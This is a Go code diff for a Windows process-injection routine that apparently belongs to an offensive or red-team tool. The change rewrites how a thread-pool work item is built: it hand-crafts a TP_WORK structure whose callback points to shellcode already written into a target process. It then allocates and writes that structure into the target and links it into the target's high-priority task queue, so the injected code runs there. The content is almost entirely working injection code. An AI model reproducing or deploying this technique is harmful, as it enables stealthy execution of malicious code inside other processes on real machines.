@@ -497,36 +497,27 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
 
-	// Step 8: Create TP_WORK structure via CreateThreadpoolWork
-	pTpWork, _, err := procCreateThreadpoolWork.Call(
-		shellcodeAddr, // Work callback points to shellcode
-		0,             // Context
-		0,             // Callback environment
-	)
-	if pTpWork == 0 {
-		return output, fmt.Errorf("CreateThreadpoolWork failed: %v", err)
-	}
-	output += "[+] Created TP_WORK structure associated with shellcode\n"
-
-	// Step 9: Read and modify the TP_WORK structure
+	// Step 8: Manually construct TP_WORK structure instead of using CreateThreadpoolWork
+	// This avoids creating a work item tied to our local process's thread pool
 	var tpWork FULL_TP_WORK
-	// Copy the structure from our local process
-	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
-		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
-			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
-	}
-
-	// Modify the structure to link it into target's task queue
+	
+	// Set up the CleanupGroupMember
 	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
+	tpWork.CleanupGroupMember.Callback = shellcodeAddr
+	
+	// Set up the Task
 	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
-	// Flink and Blink should point to the Queue LIST_ENTRY field, not the TPP_QUEUE structure
 	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
 	tpWork.Task.ListEntry.Flink = targetQueueListAddr
 	tpWork.Task.ListEntry.Blink = targetQueueListAddr
-	tpWork.WorkState.Exchange = 0x2 // Mark as insertable with pending callback
-	output += "[+] Modified TP_WORK structure for insertion\n"
+	
+	// Set WorkState: Insertable=1 (bit 0), PendingCallbackCount=1 (bits 1-31)
+	// This means: (1 << 1) | 1 = 3
+	tpWork.WorkState.Exchange = 0x3
+	
+	output += "[+] Constructed TP_WORK structure with shellcode callback\n"
 
-	// Step 10: Allocate memory for TP_WORK in target process
+	// Step 9: Allocate memory for TP_WORK in target process
 	tpWorkAddr, _, err := procVirtualAllocEx.Call(
 		uintptr(hProcess),
 		0,
@@ -539,7 +530,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)
 
-	// Step 11: Write TP_WORK to target
+	// Step 10: Write TP_WORK to target
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
 		tpWorkAddr,
@@ -552,7 +543,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)
 
-	// Step 12: Insert the work item into the task queue by updating both Flink and Blink
+	// Step 11: Insert the work item into the task queue by updating both Flink and Blink
 	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
 	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))
 	
